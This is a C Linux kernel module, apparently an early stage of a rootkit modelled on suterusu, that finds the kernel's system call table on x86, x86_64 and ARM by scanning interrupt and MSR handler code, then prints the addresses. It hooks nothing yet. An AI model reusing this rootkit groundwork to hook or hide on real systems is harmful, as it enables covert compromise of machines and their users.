/* 
参考：suterusu rootkit
github:https://github.com/mncoppola/suterusu
write up:
	cn:https://0x90syntax.wordpress.com/2016/02/21/suterusu-rootkitx86%E4%B8%8Earm%E7%9A%84%E5%86%85%E8%81%94%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0hooking/
	en:https://poppopret.org/category/rootkits/
 */

#include "common.h"
#include <linux/init.h>

unsigned long *sys_call_table;
unsigned long *ia32_sys_call_table;

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

#if defined(_CONFIG_X86_)
// Phrack #58 0x07; sd, devik
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[255];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    if ( p )
        return *(unsigned long **)((char *)p + 3);
    else
        return NULL;
}
#elif defined(_CONFIG_X86_64_)
// 
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

// Obtain sys_call_table on amd64; pouik
unsigned long *find_ia32_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 16 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}
#else // ARM
// Phrack #68 0x06; dong-hoon you
unsigned long *find_sys_call_table ( void )
{
	void *swi_addr = (long *)0xffff0008;
	unsigned long offset, *vector_swi_addr;

	offset = ((*(long *)swi_addr) & 0xfff) + 8;
	vector_swi_addr = *(unsigned long **)(swi_addr + offset);

	while ( vector_swi_addr++ )
		if( ((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000 )
        {
			offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
			return vector_swi_addr + offset;
		}

	return NULL;
}
#endif

static int lkm_init(void)
{
   
    printk("Arciryas:module loaded\n");
    #if defined(_CONFIG_X86_64_)
    ia32_sys_call_table = find_ia32_sys_call_table();
        #if __DEBUG__
    printk("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
        #endif
    #endif

    sys_call_table = find_sys_call_table();

    #if __DEBUG__
    printk("sys_call_table obtained at %p\n", sys_call_table);
    #endif
    return 0;    
}
 
static void lkm_exit(void)
{
    printk("Arciryas:module removed\n");
}
 
module_init(lkm_init);
module_exit(lkm_exit);


